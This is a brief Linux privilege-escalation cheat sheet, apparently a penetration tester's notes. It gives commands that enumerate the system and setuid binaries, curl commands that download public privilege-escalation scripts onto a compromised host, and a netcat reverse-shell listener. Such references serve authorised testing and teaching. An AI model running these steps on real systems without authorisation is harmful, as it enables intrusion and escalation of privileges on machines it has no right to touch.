# Inside Linux host

http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### Get system information
```bash
cat /etc/lsb-release
cat /etc/redhat-release
uname -a
cat /proc/version
```

### Find setuid files
```bash
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Setuid dumpable
https://serverfault.com/questions/56800/on-redhat-what-does-kernel-suid-dumpable-1-mean#56818
```bash
cat /proc/sys/fs/suid_dumpable
```

### Quick post-exploitation checks
* https://github.com/rebootuser/LinEnum
* http://www.securitysift.com/download/linuxprivchecker.py
* https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
* https://github.com/inquisb/miscellaneous
* https://github.com/pentestmonkey/unix-privesc-check
```bash
# Via curl
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh
curl http://www.securitysift.com/download/linuxprivchecker.py -o linuxprivchecker.py
curl https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl -o Linux_Exploit_Suggester.pl
curl https://raw.githubusercontent.com/inquisb/miscellaneous/master/linux-exploit-checker.py -o linux-exploit-checker.py
curl https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check -o unix-privesc-check
```

### Reverse shell
```bash
nc -vnlp <port>
```
